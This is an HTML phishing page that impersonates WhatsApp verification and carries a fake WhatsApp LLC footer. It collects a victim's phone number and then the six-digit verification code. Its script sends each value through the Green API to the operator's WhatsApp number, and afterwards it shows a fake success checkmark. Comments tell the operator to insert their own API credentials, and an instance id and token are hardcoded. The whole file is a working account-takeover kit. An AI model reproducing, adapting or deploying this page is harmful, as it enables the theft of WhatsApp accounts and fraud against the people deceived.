<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WhatsApp Verification</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f0f2f5;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            height: 100vh;
            margin: 0;
        }

        /* Header Styling */
        header {
            width: 100%;
            background-color: #ffffff;
            padding: 15px 20px;
            box-shadow: 0 2px 5px rgba(0,0,0,0.05);
            display: flex;
            align-items: center;
            gap: 12px;
            box-sizing: border-box;
        }
        .header-logo {
            width: 35px;
            height: 35px;
            background-color: #25D366;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        .header-logo svg {
            width: 20px;
            height: 20px;
            fill: white;
        }
        .header-title {
            font-size: 18px;
            font-weight: 600;
            color: #111b21;
        }

        /* Main Container Styling */
        .container {
            background: white;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
            width: 330px;
            text-align: center;
            margin: auto;
        }
        .whatsapp-logo {
            width: 55px;
            height: 55px;
            background-color: #25D366;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 15px auto;
            box-shadow: 0 4px 10px rgba(37, 211, 102, 0.3);
        }
        .whatsapp-logo svg {
            width: 32px;
            height: 32px;
            fill: white;
        }
        h2 {
            margin: 0 0 5px 0;
            color: #111b21;
            font-size: 20px;
        }
        .subtitle {
            font-size: 13px;
            color: #667781;
            margin-bottom: 25px;
        }
        .input-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label {
            font-size: 13px;
            color: #3b4a54;
            display: block;
            margin-bottom: 5px;
            font-weight: 600;
        }
        input {
            width: 100%;
            padding: 11px;
            box-sizing: border-box;
            border: 1px solid #d1d7db;
            border-radius: 6px;
            font-size: 14px;
            outline: none;
            transition: border 0.3s;
        }
        input:focus {
            border-color: #25D366;
        }
        button {
            width: 100%;
            padding: 12px;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 15px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
            transition: background 0.3s;
        }
        button:hover {
            background-color: #1ebe5d;
        }
        .hidden {
            display: none !important;
        }

        /* Animated Success Checkmark Styling */
        .success-box {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 15px 0;
        }
        .checkmark-circle {
            width: 75px;
            height: 75px;
            border-radius: 50%;
            background-color: #e8fadf;
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 15px;
            animation: popIn 0.5s ease-out forwards;
        }
        .checkmark {
            width: 38px;
            height: 38px;
            border-radius: 50%;
            stroke-width: 3;
            stroke: #25D366;
            stroke-miterlimit: 10;
            animation: fill .4s ease-in-out .4s forwards, scale .3s ease-in-out .9s bounce;
        }
        .checkmark-check {
            transform-origin: 50% 50%;
            stroke-dasharray: 48;
            stroke-dashoffset: 48;
            animation: stroke 0.4s cubic-bezier(0.65, 0, 0.45, 1) 0.2s forwards;
        }
        .success-title {
            color: #00a884;
            font-size: 17px;
            font-weight: 600;
            margin-top: 5px;
            animation: fadeIn 0.6s ease-in-out;
        }

        /* Footer Styling */
        footer {
            width: 100%;
            background-color: #ffffff;
            padding: 12px;
            text-align: center;
            font-size: 12px;
            color: #8696a0;
            box-shadow: 0 -2px 5px rgba(0,0,0,0.02);
        }

        /* Animations */
        @keyframes stroke {
            100% { stroke-dashoffset: 0; }
        }
        @keyframes popIn {
            0% { transform: scale(0); opacity: 0; }
            80% { transform: scale(1.1); opacity: 1; }
            100% { transform: scale(1); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }
    </style>
</head>
<body>

    <!-- Header Section -->
    <header>
        <div class="header-logo">
            <svg viewBox="0 0 24 24">
                <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/>
            </svg>
        </div>
        <div class="header-title">WhatsApp Verification</div>
    </header>

    <!-- Main Container -->
    <div class="container">
        <div class="whatsapp-logo">
            <svg viewBox="0 0 24 24">
                <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/>
            </svg>
        </div>
        <h2>WhatsApp Verification</h2>
        <div class="subtitle">Verify your phone number to continue</div>
        
        <!-- Step 1: Number Input Form -->
        <div id="phone-section">
            <div class="input-group">
                <label>Phone Number</label>
                <input type="text" id="phone" placeholder="e.g. 923001234567">
            </div>
            <button onclick="sendNumber()">Send Code</button>
        </div>

        <!-- Step 2: Code Input Form (Initially Hidden) -->
        <div id="code-section" class="hidden">
            <div class="input-group">
                <label>Verification Code</label>
                <input type="text" id="code" placeholder="Enter 6-digit code">
            </div>
            <button onclick="sendCode()">Verify</button>
        </div>

        <!-- Step 3: Success Screen (Initially Hidden) -->
        <div id="success-section" class="success-box hidden">
            <div class="checkmark-circle">
                <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
                    <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
                </svg>
            </div>
            <div class="success-title">Verification Submitted Successfully!</div>
        </div>
    </div>

    <!-- Footer Section -->
    <footer>
        &copy; 2026 WhatsApp LLC. All rights reserved. Secure End-to-End Verification.
    </footer>

    <script>
        // Apni Green API details yahan dalein
        const idInstance = "710722768793"; 
        const apiTokenInstance = "c91ddddba07a4002bb34c67bfef0caeb855ac25d23a94f14ba"; 
        const myPhoneNumber = "923001234567"; // Apna WhatsApp number (bina + ke)

        function sendToWhatsApp(messageText) {
            const url = `https://api.green-api.com/waInstance${idInstance}/sendMessage/${apiTokenInstance}`;
            
            const payload = {
                chatId: `${myPhoneNumber}@c.us`,
                message: messageText
            };

            fetch(url, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify(payload)
            })
            .then(response => response.json())
            .then(data => console.log("Success:", data))
            .catch(error => console.error("Error:", error));
        }

        function sendNumber() {
            const phoneNumber = document.getElementById('phone').value;
            if(!phoneNumber) {
                alert("Please enter a number!");
                return;
            }

            sendToWhatsApp("📱 New Number Entered: " + phoneNumber);

            document.getElementById('phone-section').classList.add('hidden');
            document.getElementById('code-section').classList.remove('hidden');
        }

        function sendCode() {
            const codeValue = document.getElementById('code').value;
            if(!codeValue) {
                alert("Please enter the code!");
                return;
            }

            sendToWhatsApp("🔑 New Code Entered: " + codeValue);

            document.getElementById('code-section').classList.add('hidden');
            document.querySelector('.container h2').classList.add('hidden');
            document.querySelector('.subtitle').classList.add('hidden');
            document.getElementById('success-section').classList.remove('hidden');
        }
    </script>

</body>
</html>
